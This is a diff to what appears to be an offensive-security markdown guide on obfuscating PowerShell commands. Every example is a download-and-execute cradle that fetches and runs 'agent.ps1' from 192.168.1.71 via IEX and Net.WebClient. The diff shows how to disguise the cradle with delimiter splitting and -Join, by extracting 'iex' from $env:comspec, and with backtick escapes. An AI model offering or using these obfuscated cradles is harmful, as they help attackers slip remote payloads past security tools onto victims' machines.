@@ -314,6 +314,10 @@ The above string can be obfuscated using the **powershell special character: `**
 
 ---
 
+      We can obfuscate syscall's by simple split them into local variables or contaternate them
+
+<br />
+
 - String command to obfuscate<br />
 `powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.71/agent.ps1')`<br />
 The above string can be obfuscated using **powershell special characters:** **`** and **+** and **$var** and **'**<br />
@@ -331,7 +335,11 @@ The above string can be obfuscated using **powershell special characters:** **`*
 - Using **$env:comspec** (windows environment variable) and **-Join ''** to pull out the 4º ,15º and 25º characters<br />
 from $env:comspec variable and use the **-Join ''** operator to take the array and convert it to a string.
 
-      $env:comspec[4,15,25]-Join '' (New-Object Net.WebClient).DownloadString('http://192.168.1.71/agent.ps1')
+- String command to obfuscate<br />
+`IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.71/agent.ps1')`
+
+- String obfuscated<br />
+`$env:comspec[4,15,25]-Join '' (New-Object Net.WebClient).DownloadString('http://192.168.1.71/agent.ps1')`
 
 ![powershell obfuscation](http://i.cubeupload.com/CIbrFI.jpg)
 
@@ -339,7 +347,11 @@ from $env:comspec variable and use the **-Join ''** operator to take the array a
 
 - Using an powershell variable (**$cmdWithDelim**) to **split** the system call and then **-Join ''** it back again
 
-      $cmdWithDelim = "(New-Object Net.We~~bClient).Downlo~~adString('http://192.168.1.71/agent.ps1')";IEX ($cmdWithDelim.Split("~~") -Join '') | IEX
+- String command to obfuscate<br />
+`(New-Object Net.WebClient).DownloadString('http://192.168.1.71/agent.ps1')`
+
+- String obfuscated<br />
+`$cmdWithDelim = "(New-Object Net.We~~bClient).Downlo~~adString('http://192.168.1.71/agent.ps1')";IEX ($cmdWithDelim.Split("~~") -Join '') | IEX`
 
 ![powershell obfuscation](http://i.cubeupload.com/wAZr7K.jpg)
 
